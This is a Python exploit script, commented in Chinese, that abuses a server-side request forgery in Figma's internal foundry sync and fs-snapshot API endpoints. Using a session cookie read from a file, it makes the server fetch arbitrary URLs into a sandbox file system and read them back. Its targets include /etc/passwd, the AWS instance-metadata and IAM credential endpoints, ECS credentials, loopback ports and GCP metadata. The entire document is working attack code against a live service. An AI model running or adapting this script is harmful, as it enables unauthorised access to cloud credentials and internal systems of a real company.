"""foundry sync downloadUrl SSRF 利用链:任意 URL fetch → 写入 VFS → fs-snapshot 回显
schema:1037 chunk 136858 k=union([{type:upsert, entry:w},...]), w=union([S={path,contents,metadata}, T={path,downloadUrl,metadata}])
"""
import io, json, urllib.request, sys, re, base64
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call(path, body, timeout=60):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web",
            "X-Figma-User-ID": UID, "X-Figma-File-Key": PUB_KEY}
    data = json.dumps(body).encode()
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')
    except Exception as e:
        return 0, f"!! {type(e).__name__} {str(e)[:80]}"

def ssrf_fetch(url, tag):
    """downloadUrl=fetch 到 VFS,再读回"""
    fname = "code/DL_%s.txt" % tag
    body = {"vfsChangeByPath": {tag: {"type": "upsert",
            "entry": {"path": fname, "downloadUrl": url, "metadata": {"version": "1", "guid": "g1"}}}},
            "entrypointsByIdentifier": {}}
    st1, r1 = call("/api/cortex/foundry/sync", body, timeout=90)
    ok = '"fileSyncDuration"' in r1 or st1 == 200
    # 读回(落盘位置 = code/src/ + path)
    st2, snap = call("/api/cortex/foundry/fs-snapshot",
                     {"sboxdUrl": SBOX, "path": "code/src/" + fname, "options": {"content": "snapshot"}}, timeout=60)
    content = ""
    for m in re.finditer(r'data: (\{.*?\})\n', snap, re.S):
        try:
            o = json.loads(m.group(1))
        except Exception:
            continue
        if o.get("type") == "fswatch/event" and o.get("content"):
            content = base64.b64decode(o["content"]).decode(errors='replace')
    print(f"=== [{tag}] {url}")
    print(f"    sync {st1} | read {st2} | len {len(content)}")
    if content:
        print("    " + content.replace("\n", "\n    ")[:600])
    else:
        print("    (empty/error) " + snap[:150].replace("\n", " "))
    return content

# 拿 sandbox
st, resp = call("/api/cortex/foundry/sandbox", {})
SBOX = json.loads(resp)["sboxdUrl"]
print("sandbox:", st, SBOX[:50])

# 1. file:// 协议
ssrf_fetch("file:///etc/passwd", "file_passwd")
ssrf_fetch("file:///etc/hostname", "file_host")
# 2. AWS metadata(IMDSv1)
ssrf_fetch("http://169.254.169.254/latest/meta-data/", "aws_meta")
ssrf_fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_iam")
# 3. AWS ECS 凭证
ssrf_fetch("http://169.254.170.2/v2/credentials", "ecs_cred")
# 4. 本地回环
ssrf_fetch("http://127.0.0.1/", "lo_root")
ssrf_fetch("http://localhost/", "lo_host")
# 5. 常见内网端口
ssrf_fetch("http://127.0.0.1:8080/", "lo_8080")
ssrf_fetch("http://127.0.0.1:3000/", "lo_3000")
# 6. GCP metadata
ssrf_fetch("http://metadata.google.internal/computeMetadata/v1/", "gcp_meta")
